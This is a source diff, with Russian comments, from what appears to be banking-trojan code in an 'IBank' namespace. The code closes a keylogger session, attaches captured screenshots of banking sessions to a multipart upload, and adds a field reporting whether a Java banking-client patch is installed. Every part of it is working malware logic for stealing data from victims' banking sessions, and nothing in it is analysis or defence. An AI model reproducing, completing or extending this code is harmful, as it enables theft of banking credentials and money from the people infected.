@@ -193,16 +193,6 @@ namespace IBank
 	{
 		// Идёт запрос на сервер, закрываем систему.
 		#ifndef JAVS_PATCHERH
-
-			// Проверяем наличие сигнального фала
-//			string SignalFile(MAX_PATH);
-//			pSHGetSpecialFolderPathA(NULL, SignalFile.t_str(), CSIDL_COMMON_APPDATA, TRUE);
-//
-//			SignalFile.CalcLength();
-//            SignalFile += "\\netsend.dat";
-//
-//			if (!FileExistsA(SignalFile.t_str()))
-
 			KeyLogger::CloseSession();
         #else
 			struct sockaddr_in* info = (struct sockaddr_in*)name;
@@ -424,14 +414,21 @@ namespace IBank
 		if (Log->StartScreenShot.Data != NULL)
 		{
 			MultiPartData::AddBlobAsFile(Data, "windscreen", "SS_1.png", NULL, (LPBYTE)Log->StartScreenShot.Data, Log->StartScreenShot.Size);
-		    //File::WriteBufferA("c:\\SS_1.png", Log->StartScreenShot.Data, Log->StartScreenShot.Size);
         }
 
 		if (Log->EndScreenShot.Data != NULL)
 		{
 			MultiPartData::AddBlobAsFile(Data, "procscreen", "SS_2.png", NULL, (LPBYTE)Log->EndScreenShot.Data, Log->EndScreenShot.Size);
-		   //File::WriteBufferA("c:\\SS_2.png", (LPBYTE)Log->EndScreenShot.Data, Log->EndScreenShot.Size);
-        }
+		}
+
+        // Записываем признак установленного явапатча
+		#ifdef JavaClient2015SaverH
+			PCHAR PatchInstalled = (JavaPatchInstalled()) ? "1" : "0";
+		#else
+			PCHAR PatchInstalled = "0";
+		#endif
+		MultiPartData::AddStringField(Data, "patchsetuped",  PatchInstalled);
+
 
 		// Отправляем запрос
 
